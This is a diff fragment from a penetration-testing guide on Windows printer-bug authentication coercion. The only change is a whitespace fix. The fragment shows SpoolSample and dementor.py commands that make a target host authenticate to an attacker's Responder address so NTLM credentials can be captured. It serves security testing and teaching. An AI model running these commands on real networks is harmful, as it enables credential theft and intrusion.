@@ -36,7 +36,7 @@ You can compile[ **SpoolSample from here**](https://github.com/NotMedic/NetNTLMt
 SpoolSample.exe <TARGET> <RESPONDERIP>
 ```
 
-or use [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket)  or [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) if you're on Linux
+or use [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) or [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) if you're on Linux
 
 ```bash
 python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
